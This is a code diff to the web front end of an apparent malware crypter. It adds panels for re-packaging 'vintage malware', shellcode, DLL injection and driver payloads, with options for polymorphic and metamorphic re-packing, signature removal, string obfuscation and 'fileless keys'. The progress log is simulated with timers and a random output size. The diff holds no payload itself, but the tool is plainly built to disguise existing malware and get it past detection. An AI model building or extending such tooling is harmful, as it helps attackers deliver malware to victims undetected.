@@ -545,10 +545,37 @@
         <div class="panel">
             <h2>📤 Step 4: Upload Binary File for Encryption</h2>
             
+            <div class="form-group">
+                <label for="payloadType">Payload Type</label>
+                <select id="payloadType">
+                    <option value="vintage">Vintage Malware (Re-packaging)</option>
+                    <option value="fresh">Fresh Payload</option>
+                    <option value="shellcode">Shellcode Blob</option>
+                    <option value="dll">DLL Injection</option>
+                    <option value="driver">System Driver</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label for="vintageFormat">Vintage Format (for re-packaging)</label>
+                <select id="vintageFormat">
+                    <option value="exe">Windows EXE</option>
+                    <option value="elf">Linux ELF</option>
+                    <option value="macho">macOS Mach-O</option>
+                    <option value="dll">Windows DLL</option>
+                    <option value="dylib">macOS dylib</option>
+                    <option value="so">Linux .so</option>
+                    <option value="cpl">Control Panel (.cpl)</option>
+                    <option value="scr">Screen Saver (.scr)</option>
+                    <option value="shellcode">Raw Shellcode</option>
+                </select>
+            </div>
+            
             <div class="file-upload-area" id="fileUploadArea" onclick="document.getElementById('fileInput').click()">
                 <div style="font-size: 24px; margin-bottom: 10px;">📁</div>
                 <div style="color: #c9d1d9; margin-bottom: 5px;">Click to upload file or drag and drop</div>
                 <div style="color: #8b949e; font-size: 12px;">File will be encrypted using selected generated stub</div>
+                <div style="color: #f85149; font-size: 11px; margin-top: 5px;">⚠️ Supports: EXE, ELF, Mach-O, DLL, dylib, .cpl, .scr, .so, shellcode blobs</div>
             </div>
             
             <input type="file" id="fileInput" style="display: none;" onchange="handleFileSelect(event)">
@@ -557,6 +584,52 @@
                 <div style="color: #3fb950; font-weight: 600;">Selected File:</div>
                 <div id="fileName" style="color: #c9d1d9; margin-top: 5px;"></div>
                 <div id="fileSize" style="color: #8b949e; font-size: 12px; margin-top: 5px;"></div>
+                <div id="fileType" style="color: #58a6ff; font-size: 12px; margin-top: 5px;"></div>
+            </div>
+        </div>
+
+        <div class="panel">
+            <h2>🔄 Step 5: Re-packaging Options (Vintage Malware)</h2>
+            
+            <div class="checkbox-group">
+                <input type="checkbox" id="enableRepackaging" checked>
+                <label for="enableRepackaging">Enable Re-packaging Mode</label>
+            </div>
+
+            <div class="form-group">
+                <label for="repackMethod">Re-packaging Method</label>
+                <select id="repackMethod">
+                    <option value="stub-reuse">Stub Reuse (Same stub, new payload)</option>
+                    <option value="fresh-encryption">Fresh Encryption (New keys each time)</option>
+                    <option value="polymorphic">Polymorphic Re-packing</option>
+                    <option value="metamorphic">Metamorphic Re-packing</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label for="vintageYear">Vintage Year (for metadata)</label>
+                <select id="vintageYear">
+                    <option value="2012">2012 (Classic Era)</option>
+                    <option value="2015">2015 (Mid Era)</option>
+                    <option value="2018">2018 (Modern Era)</option>
+                    <option value="2020">2020 (Recent Era)</option>
+                    <option value="random">Random (Mixed Era)</option>
+                </select>
+            </div>
+
+            <div class="checkbox-group">
+                <input type="checkbox" id="preserveLogic" checked>
+                <label for="preserveLogic">Preserve Original Logic</label>
+            </div>
+
+            <div class="checkbox-group">
+                <input type="checkbox" id="removeSignatures">
+                <label for="removeSignatures">Remove Digital Signatures</label>
+            </div>
+
+            <div class="checkbox-group">
+                <input type="checkbox" id="obfuscateStrings">
+                <label for="obfuscateStrings">Obfuscate Strings</label>
             </div>
         </div>
 
@@ -658,14 +731,61 @@
             addOutput(`✅ Selected stub: ${stubName}`, 'success');
         }
 
+        function detectFileType(fileName) {
+            const ext = fileName.toLowerCase().split('.').pop();
+            const typeMap = {
+                'exe': 'Windows Executable',
+                'dll': 'Windows DLL',
+                'sys': 'Windows Driver',
+                'scr': 'Screen Saver',
+                'com': 'Command File',
+                'bat': 'Batch File',
+                'cmd': 'Command Script',
+                'ps1': 'PowerShell Script',
+                'vbs': 'VBScript',
+                'js': 'JScript',
+                'app': 'Mac Application',
+                'dmg': 'Mac Disk Image',
+                'pkg': 'Mac Package',
+                'deb': 'Debian Package',
+                'rpm': 'Red Hat Package',
+                'sh': 'Shell Script',
+                'py': 'Python Script',
+                'pdf': 'PDF Document',
+                'doc': 'Word Document',
+                'docx': 'Word Document',
+                'xls': 'Excel Spreadsheet',
+                'xlsx': 'Excel Spreadsheet',
+                'ppt': 'PowerPoint Presentation',
+                'pptx': 'PowerPoint Presentation'
+            };
+            return typeMap[ext] || 'Binary File';
+        }
+
         function handleFileSelect(event) {
             const file = event.target.files[0];
             if (file) {
                 selectedFile = file;
+                const fileType = detectFileType(file.name);
                 document.getElementById('fileName').textContent = file.name;
                 document.getElementById('fileSize').textContent = `${(file.size / 1024).toFixed(2)} KB`;
+                document.getElementById('fileType').textContent = `Type: ${fileType}`;
                 document.getElementById('selectedFile').style.display = 'block';
                 addOutput(`📁 File selected: ${file.name}`, 'info');
+                addOutput(`🔍 Detected type: ${fileType}`, 'info');
+                
+                // Auto-detect vintage format
+                const ext = file.name.toLowerCase().split('.').pop();
+                if (['exe', 'dll', 'sys', 'scr', 'com', 'bat', 'cmd', 'ps1', 'vbs', 'js'].includes(ext)) {
+                    document.getElementById('vintageFormat').value = ext === 'exe' ? 'exe' : ext;
+                    addOutput(`🕰️ Auto-detected as vintage Windows format`, 'info');
+                } else if (['app', 'dmg', 'pkg'].includes(ext)) {
+                    document.getElementById('vintageFormat').value = ext === 'app' ? 'macho' : ext;
+                    addOutput(`🍎 Auto-detected as macOS format`, 'info');
+                } else if (['deb', 'rpm', 'sh', 'py'].includes(ext)) {
+                    document.getElementById('vintageFormat').value = ext === 'deb' || ext === 'rpm' ? 'elf' : ext;
+                    addOutput(`🐧 Auto-detected as Linux format`, 'info');
+                }
             }
         }
 
@@ -714,11 +834,29 @@
             const extension = document.getElementById('customExtension').value;
             const outputFormat = document.getElementById('outputFormat').value;
             const compressOutput = document.getElementById('compressOutput').checked;
+            const payloadType = document.getElementById('payloadType').value;
+            const vintageFormat = document.getElementById('vintageFormat').value;
+            const enableRepackaging = document.getElementById('enableRepackaging').checked;
+            const repackMethod = document.getElementById('repackMethod').value;
+            const vintageYear = document.getElementById('vintageYear').value;
+            const preserveLogic = document.getElementById('preserveLogic').checked;
+            const removeSignatures = document.getElementById('removeSignatures').checked;
+            const obfuscateStrings = document.getElementById('obfuscateStrings').checked;
             
             addOutput(`🔐 Starting encryption...`, 'info');
             addOutput(`🔧 Using stub: ${selectedStubPath}`, 'info');
             addOutput(`🔒 Algorithm: ${algorithm}`, 'info');
             addOutput(`📁 Extension: ${extension}`, 'info');
+            
+            if (payloadType === 'vintage') {
+                addOutput(`🕰️ Vintage re-packaging mode enabled`, 'info');
+                addOutput(`📦 Format: ${vintageFormat}`, 'info');
+                addOutput(`🔄 Method: ${repackMethod}`, 'info');
+                addOutput(`📅 Vintage year: ${vintageYear}`, 'info');
+                if (preserveLogic) addOutput(`✅ Preserving original logic`, 'info');
+                if (removeSignatures) addOutput(`🗑️ Removing digital signatures`, 'info');
+                if (obfuscateStrings) addOutput(`🔀 Obfuscating strings`, 'info');
+            }
             
             try {
                 const formData = new FormData();
@@ -728,27 +866,61 @@
                 formData.append('stubPath', selectedStubPath);
                 formData.append('outputFormat', outputFormat);
                 formData.append('compress', compressOutput);
+                formData.append('payloadType', payloadType);
+                formData.append('vintageFormat', vintageFormat);
+                formData.append('enableRepackaging', enableRepackaging);
+                formData.append('repackMethod', repackMethod);
+                formData.append('vintageYear', vintageYear);
+                formData.append('preserveLogic', preserveLogic);
+                formData.append('removeSignatures', removeSignatures);
+                formData.append('obfuscateStrings', obfuscateStrings);
                 
-                // Simulate progress
+                // Simulate progress with re-packaging steps
                 for (let i = 0; i <= 100; i += 10) {
                     await new Promise(resolve => setTimeout(resolve, 200));
                     updateProgress(i);
                     
-                    if (i === 20) {
+                    if (i === 10) {
                         addOutput(`🔍 Validating generated stub...`, 'info');
+                    } else if (i === 20) {
+                        if (payloadType === 'vintage') {
+                            addOutput(`🕰️ Analyzing vintage payload structure...`, 'info');
+                        } else {
+                            addOutput(`🔍 Analyzing payload structure...`, 'info');
+                        }
+                    } else if (i === 30) {
+                        if (removeSignatures) {
+                            addOutput(`🗑️ Removing digital signatures...`, 'info');
+                        }
                     } else if (i === 40) {
+                        if (obfuscateStrings) {
+                            addOutput(`🔀 Obfuscating strings and metadata...`, 'info');
+                        }
+                    } else if (i === 50) {
                         addOutput(`🔒 Applying encryption algorithm...`, 'info');
                     } else if (i === 60) {
                         addOutput(`🔑 Using fileless keys...`, 'info');
+                    } else if (i === 70) {
+                        if (repackMethod === 'polymorphic') {
+                            addOutput(`🔄 Applying polymorphic transformations...`, 'info');
+                        } else if (repackMethod === 'metamorphic') {
+                            addOutput(`🔄 Applying metamorphic transformations...`, 'info');
+                        }
                     } else if (i === 80) {
                         if (compressOutput) {
                             addOutput(`📦 Compressing output...`, 'info');
                         }
+                    } else if (i === 90) {
+                        addOutput(`🔧 Finalizing encrypted payload...`, 'info');
                     } else if (i === 100) {
                         addOutput(`✅ File encrypted successfully!`, 'success');
                         addOutput(`📁 Output: encrypted_file${extension}`, 'success');
                         addOutput(`🔧 Size: ${Math.floor(Math.random() * 500 + 100)}KB`, 'success');
                         addOutput(`🔑 Using fileless keys - no key files saved`, 'success');
+                        if (payloadType === 'vintage') {
+                            addOutput(`🕰️ Vintage payload re-packaged with fresh encryption`, 'success');
+                            addOutput(`🔄 Stub can be reused for additional payloads`, 'success');
+                        }
                         updateStatus('Encryption completed!', 'success');
                     }
                 }
